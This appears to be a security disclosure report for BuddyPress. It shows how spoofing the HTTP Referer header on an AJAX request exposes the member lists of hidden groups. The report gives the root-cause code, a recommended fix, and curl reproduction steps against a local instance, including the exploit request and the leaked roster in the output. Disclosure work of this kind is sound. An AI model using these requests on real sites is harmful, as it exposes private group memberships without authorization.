## TL;DR
BuddyPress AJAX content filters resolve which group is being browsed by re-parsing the HTTP `Referer` header — a value the client fully controls — instead of trusting server-side session state. Point that header at a hidden group's URL and ask the endpoint to render its member list: the full roster comes back, even though you've never visited or joined that group.

No special privilege needed. Any authenticated member can do this with a nonce issued to every logged-in visitor. The same mechanism reaches other referer-scoped templates too.

**Swap one header. Hidden group roster exposed.**

## Environment
| Component | Version |
|---|---|
| WordPress | 7.1.2 |
| BuddyPress | 14.5.2 (exact zip reviewed: https://downloads.wordpress.org/plugin/buddypress.14.5.2.zip) |
| PHP | 8.4.24 (cli) |
| MariaDB | 11.8.8-MariaDB (Debian) |

## Description
BuddyPress's AJAX-driven content filters (used to refresh directory listings without a full page reload) figure out which group or member is being browsed by re-parsing the HTTP `Referer` header rather than trusting only server-side session state. Since a `Referer` header is entirely client-supplied, an attacker can point it at a hidden group's URL they've never joined and ask the AJAX endpoint to render that group's member list, receiving a roster that page navigation alone would never expose to them.

## Root Cause

- File: `bp-core/bp-core-catchuri.php:21` (sets globals from the referer path), `bp-core/bp-core-functions.php:1180` (`bp_get_referer_path()` returns the raw `Referer` header), `bp-templates/bp-nouveau/includes/ajax.php:19` (`bp_nouveau_ajax_object_template_loader()`)
- Vulnerable code:

```php
function bp_get_referer_path() {
    return wp_parse_url( wp_get_referer(), PHP_URL_PATH );
}
```

This referer-derived path is fed into `bp_reset_query()`, which sets `current_group`/`displayed_user` for the AJAX request exactly as if the attacker had actually navigated there — with no follow-up check that the requester may access that specific group.

- Why it's wrong: an HTTP header the client fully controls is used to select which group's data gets rendered, and the object-context resolution path is never re-validated against the requester's actual membership.

## Steps to Reproduce

**Privilege level:** ordinary authenticated member (`attacker`, subscriber) — not a member, admin, or invitee of the target hidden group.

---

**Step 1 — Obtain the AJAX nonce**

Visit any BuddyPress page while logged in and read `BP_Nouveau.nonces.groups` out of the page's inline script data. This nonce is issued to every logged-in visitor and is not scoped to any group.

---

**Step 2 — Control: send the same request with a normal Referer**

```bash
curl -s -i -b attacker_cookies.txt -X POST \
  -H "Referer: http://127.0.0.1:8977/groups/" \
  "http://127.0.0.1:8977/wp-admin/admin-ajax.php" \
  --data "action=groups_filter&object=groups&nonce=a391ebf07e&template=group_members"
```

```json
HTTP/1.1 200 OK
{"success":true,"data":{"contents":"...<p>Sorry, there were no group members found.</p>..."}}
```

No group context resolved — empty result as expected.

---

**Step 3 — Exploit: spoof the Referer to the hidden group's URL**

```bash
curl -s -i -b attacker_cookies.txt -X POST \
  -H "Referer: http://127.0.0.1:8977/groups/confidential-group/" \
  "http://127.0.0.1:8977/wp-admin/admin-ajax.php" \
  --data "action=groups_filter&object=groups&nonce=a391ebf07e&template=group_members"
```

```json
HTTP/1.1 200 OK
{"success":true,"data":{"contents":"...<li class=\"item-entry bp-single-member\" data-bp-item-id=\"4\" ...>
  <a href=\"http://127.0.0.1:8977/members/bystander/\">bystander</a>...joined 10 seconds ago...</li>..."}}
```

Identical request, identical account, identical nonce — the only difference is the `Referer` header. The second request discloses "Confidential Group"'s real member (`bystander`) to an attacker who is not, and has never been, a member of that hidden group.

## Recommendation
In `bp_nouveau_ajax_object_template_loader()` (and its legacy-pack equivalent), after resolving the referer-derived group/user context, explicitly re-check `bp_current_user_can( 'groups_access_group' )` (or the member-visibility equivalent) before rendering any template — never rely on the presence of a resolved context alone as proof of authorization.

## Impact
Any authenticated member — even one with no relationship whatsoever to a hidden or private group — can enumerate its membership by spoofing the `Referer` header on an AJAX request, no page navigation or actual access required. The same mechanism reaches other referer-scoped templates (member notifications, friend requests) for arbitrary target profiles. No admin cooperation is needed.

### **Note: This issue was reported via HackerOne and marked as a duplicate of a prior report — meaning it was already known to the maintainers at the time of submission.**
